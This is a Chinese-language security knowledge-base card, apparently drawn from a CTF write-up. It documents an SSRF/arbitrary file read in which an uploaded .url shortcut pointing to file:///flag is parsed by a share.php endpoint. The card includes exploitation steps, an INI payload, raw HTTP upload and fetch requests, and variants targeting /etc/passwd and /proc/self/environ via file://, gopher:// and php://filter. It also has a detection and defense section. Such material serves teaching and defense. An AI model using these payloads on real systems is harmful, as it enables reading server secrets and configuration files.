---
id: web-generic-ssrf-url-shortcut-upload-file-scheme-read
title: 允许上传 .url 快捷方式 + share 解析 URL：file:// 协议读取服务器本地文件
type: scenario
domain: web
path: web/generic/ssrf
technique: url-shortcut-upload-file-scheme-read
tags:
- ssrf
- file-protocol
- upload
- url-shortcut
- arbitrary-file-read
- windows
- ctf
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:00:11+08:00'
  notes: 已对照原文9题“Top10大考察”段与图05核对：上传白名单含.url、share.php提示支持.url快捷方式解析、[InternetShortcut] URL=file:///flag、响应回显flag{SSRF_WAF_Byp4ss_Curl_Url_2026Summer}均一致。未验证点：PoC未本机复跑；share.php后端解析实现未给出，file://是否可用依赖该解析器；frontmatter无sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-url-shortcut-upload-file-scheme-read/
draft: false
kb_aliases:
- .url 文件上传
- InternetShortcut
- URL=file:///flag
- share.php 读 .url
- 快捷方式 SSRF
- file:// 任意文件读取
- 上传白名单绕过
---

## 一句话结论

上传功能允许 jpg/jpeg/gif/png 图片和 `.url` 快捷方式，且 `share.php?file=` 会解析并读取已上传文件；攻击者上传内容为 `[InternetShortcut]\nURL=file:///flag` 的 `.url` 文件，share 解析其中的 URL 并走 `file://` 协议，直接把服务器本地 `/flag` 内容回显，绕过 share 的路径遍历拦截。

## 原理

- **`.url` 是 Windows Internet Shortcut**：它本质是 INI 文本，`[InternetShortcut]` 段下的 `URL=` 指定目标；Windows/部分解析库会读取该字段并访问 URL。上传白名单只按扩展名允许 `.url`，没有检查内容。
- **share 解析并读取**：`share.php?file=uploads/{hash}.url` 的服务端逻辑会读取上传文件（或解析 `.url` 的 `URL=` 字段）并抓取目标；当 `URL=file:///flag` 时，底层文件/URL 客户端按 `file://` 协议读取本地文件，把内容返回给页面。
- **绕过路径遍历拦截**：直接 `share.php?file=../../../flag.txt` 会被“路径遍历攻击已被拦截”拦截；但 `.url` 的路径是 `uploads/{hash}.url`（合法路径），危险的是文件内容里的 `file://` URL，路径校验看不到。
- **为什么能读**：`file://` 协议由服务端进程解析，路径指向本机文件系统；进程对 `/flag` 有读权限时直接返回内容。上传图片会校验 MIME，但 `.url` 是文本，不触发图片校验。
- **影响**：任意本地文件读取（配置、密钥、flag）；若解析器还支持 `http://`/`gopher://`，可进一步 SSRF 内网。

## 触发条件

- 上传功能允许 `.url`/`.lnk`/`.webloc` 等快捷方式文件，或允许任意文本文件。
- 存在 share/预览/解析接口，会读取上传文件内容并访问其中的 URL（或直接用 `file_get_contents`/`curl` 处理）。
- 服务端 URL 客户端支持 `file://` 协议，且未限制协议白名单。
- 进程对目标本地文件有读权限。

## 利用步骤

1. 正常上传一张图片和 `.url` 文件，确认上传成功并得到 hash/路径。
2. 构造 `.url` 内容：
   ```ini
   [InternetShortcut]
   URL=file:///flag
   ```
3. 上传该 `.url`，访问 `share.php?file=uploads/{hash}.url`（或对应分享/预览接口）。
4. 响应中读取 `<pre>flag{...}</pre>`；若被过滤，尝试 `file:///etc/passwd`、`file:///proc/self/environ`、URL 编码路径、`file://localhost/flag` 等变体。
5. 若 share 只解析特定字段，保持 INI 段名/键名与正常 `.url` 一致；必要时加 `IconFile=` 等字段伪装。

## PoC

```ini
[InternetShortcut]
URL=file:///flag
```

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="a.url"
Content-Type: application/octet-stream

[InternetShortcut]
URL=file:///flag
------x--
```

```http
GET /share.php?file=uploads/<hash>.url HTTP/1.1
Host: <target>
```

预期返回 `/flag` 内容。原文实测得到 `flag{SSRF_WAF_Byp4ss_Curl_Url_2026Summer}`；未在本库复跑。

## 变体与关联

- **快捷方式变体**：`.url`（INI）、`.lnk`（Windows Shell Link）、`.webloc`（macOS plist）、`.desktop`（Linux）。
- **协议变体**：`file://`、`http://`（内网 SSRF）、`gopher://`、`dict://`、`php://filter`（若解析器是 PHP）。
- **上传变体**：白名单只按扩展名、MIME 只对图片校验、双扩展名、Content-Type 伪造。
- **关联卡片**：[[web-generic-ssrf-zentao-webhook-file-protocol-arbitrary-read]]（file:// 协议读取）、[[web-generic-ssrf-php-curl-get-file-scheme-config-read]]（PHP curl file:// 配置读取）、[[web-generic-file-upload-zip-slip-webshell-write]]（上传写文件）。

## 检测与防御

- **协议白名单**：服务端 URL 抓取只允许 `http/https`，禁止 `file://`、`gopher://`、`dict://`、`php://` 等；对重定向目标再次校验。
- **上传校验**：不要只按扩展名允许快捷方式/文本文件；对 `.url`/`.lnk` 解析后校验 URL 协议与目标，或直接禁止上传。
- **路径/内容分离**：share 只读取上传目录内的静态文件，不解析文件中的 URL；需要预览时使用沙箱/只读渲染。
- **最小权限**：Web 进程不能读 flag/密钥；敏感文件放在进程不可读的位置。
- **检测**：上传目录出现 `[InternetShortcut]`/`URL=file://`；share 请求触发本地文件读取；响应中出现 `/etc/passwd`/`/flag` 等路径内容。
